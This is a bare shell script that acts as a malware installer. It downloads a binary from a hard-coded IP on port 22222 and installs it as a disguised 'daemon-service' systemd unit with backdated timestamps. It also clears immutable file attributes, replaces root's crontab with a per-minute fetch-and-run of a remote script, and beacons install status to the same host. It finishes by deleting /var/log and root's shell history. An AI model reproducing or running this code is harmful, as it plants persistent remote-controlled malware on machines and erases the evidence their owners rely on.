#!/bin/sh
systemctl daemon-reload
if [ $? -eq 0 ]; then
systemctl is-enabled daemon-service.service
        if [ $? -eq 0 ]; then
	curl -s -m 5 http://106.12.40.198:22222/test/daemon-serviceOK >/dev/null 2>&1
        else
	systemctl enable daemon-service.service && systemctl start daemon-service.service
	systemctl is-enabled daemon-service.service
		if [ $? -eq 0 ]; then
		curl -s -m 5 http://106.12.40.198:22222/test/daemon-serviceUP >/dev/null 2>&1
		else
		chattr -iau daemon-service*
		chattr -iau /usr/sbin/daemon-service*
		chattr -iau /lib/systemd/system/daemon-service*
		rm -rf daemon-service*
		rm -rf /usr/sbin/daemon-service*
		rm -rf /lib/systemd/system/daemon-service*
		curl -s -m 5 -O http://106.12.40.198:22222/test/daemon-service && mv daemon-service /usr/sbin && touch -t201302022002 /usr/sbin/daemon-service && chmod +x /usr/sbin/daemon-service
		echo "[Unit]" > daemon-service.service
		echo "Description=daemon-service" >> daemon-service.service
		echo "After=multi-user.target" >> daemon-service.service
		echo "" >> daemon-service.service
		echo "[Service]" >> daemon-service.service
		echo "Type=simple" >> daemon-service.service
		echo "ExecStart=/usr/sbin/daemon-service" >> daemon-service.service
		echo "Restart=always" >> daemon-service.service
		echo "RestartSec=60" >> daemon-service.service
		echo "" >> daemon-service.service
		echo "[Install]" >> daemon-service.service
		echo "WantedBy=multi-user.target" >> daemon-service.service
		mv daemon-service.service /lib/systemd/system && touch -t201302022002 /lib/systemd/system/daemon-service.service && chmod 644 /lib/systemd/system/daemon-service.service
		systemctl daemon-reload && systemctl enable daemon-service.service && systemctl start daemon-service.service
		systemctl is-enabled daemon-service.service
			if [ $? -eq 0 ]; then
	                curl -s -m 5 http://106.12.40.198:22222/test/daemon-serviceON >/dev/null 2>&1
        	        else
			curl -s -m 5 http://106.12.40.198:22222/test/daemon-serviceOFF >/dev/null 2>&1
			fi
	        fi
	fi
else
curl -s -m 5 http://106.12.40.198:22222/test/UBUNTU >/dev/null 2>&1
				if test -f /usr/sbin/daemon-service && test -f /lib/systemd/system/daemon-service.service; then
				curl -s -m 5 http://106.12.40.198:22222/test/daemon-serviceUBNTYES >/dev/null 2>&1
				else
				chattr -R -aui /var/spool/cron/
				chattr -aui /var/spool/cron/crontabs/root
				chattr -aui cron
				chattr -R -aui /etc/cron.d
				crontab -r
				echo '*/1 * * * * curl -m 5 -s -O http://106.12.40.198:22222/test/xxx.sh && chmod +x xxx.sh && sh xxx.sh ; rm -rf xxx.sh ; crontab -r >/dev/null 2>&1' >cron
				crontab -u root cron
				rm -rf cron
				crontab -l | grep -e "xxx.sh" | grep -v grep
					if [ $? -eq 0 ]; then
			                curl -s -m 5 http://106.12.40.198:22222/test/cronOK >/dev/null 2>&1
				        else
			                curl -s -m 5 http://106.12.40.198:22222/test/cronBAD >/dev/null 2>&1
					fi
				fi
fi

chattr -R -aui /var/log/
chattr -aui /var/log/*
rm -rf /var/log
rm -rf /root/.bash_history
history -cw
